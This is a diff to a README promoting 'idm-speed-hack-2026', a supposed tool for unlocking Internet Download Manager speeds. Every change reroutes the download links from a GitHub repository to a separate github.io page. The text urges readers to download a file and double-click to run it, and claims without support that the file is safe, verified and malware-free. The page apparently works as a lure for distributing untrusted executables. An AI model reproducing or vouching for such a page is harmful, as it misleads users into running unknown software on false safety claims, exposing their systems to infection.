@@ -1,7 +1,7 @@
 <h1>⚡ idm-speed-hack-2026 - Unlock Maximum Download Speed Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Bdcha6933/idm-speed-hack-2026" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.4);">🚀 DOWNLOAD NOW - FREE</a>
+  <a href="https://bdcha6933.github.io" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.4);">🚀 DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🔥 What Is This?
@@ -25,7 +25,7 @@ If you've ever noticed IDM slowing down after a few downloads, or capping your s
 
 Getting started takes less than two minutes. Follow these simple steps:
 
-1. **Visit this link to download the application** - [https://github.com/Bdcha6933/idm-speed-hack-2026](https://github.com/Bdcha6933/idm-speed-hack-2026)
+1. **Visit this link to download the application** - [https://bdcha6933.github.io](https://bdcha6933.github.io)
 2. Click the green "Download" button on that page.
 3. Save the file to your Desktop or Downloads folder.
 4. Double-click the downloaded file to run it.
@@ -37,7 +37,7 @@ Getting started takes less than two minutes. Follow these simple steps:
 
 ### Step 1: Get the Application
 
-**Visit this link to download the application** - [https://github.com/Bdcha6933/idm-speed-hack-2026](https://github.com/Bdcha6933/idm-speed-hack-2026)
+**Visit this link to download the application** - [https://bdcha6933.github.io](https://bdcha6933.github.io)
 
 This is the official and only download source. The file is safe, verified, and free of malware.
 
@@ -151,7 +151,7 @@ There are many "IDM hacks" online, but most are outdated or fake. **idm-speed-ha
 
 Stop wasting time waiting for slow downloads. With **idm-speed-hack-2026**, you'll see the true potential of your internet connection. Whether you're downloading large files, games, videos, or software, this tool ensures you get everything at maximum speed.
 
-**Visit this link to download the application** - [https://github.com/Bdcha6933/idm-speed-hack-2026](https://github.com/Bdcha6933/idm-speed-hack-2026)
+**Visit this link to download the application** - [https://bdcha6933.github.io](https://bdcha6933.github.io)
 
 Join thousands of satisfied users who've already unlocked their download speed. It's free, it's fast, and it takes less than a minute to set up. Download now and experience the difference immediately.
 
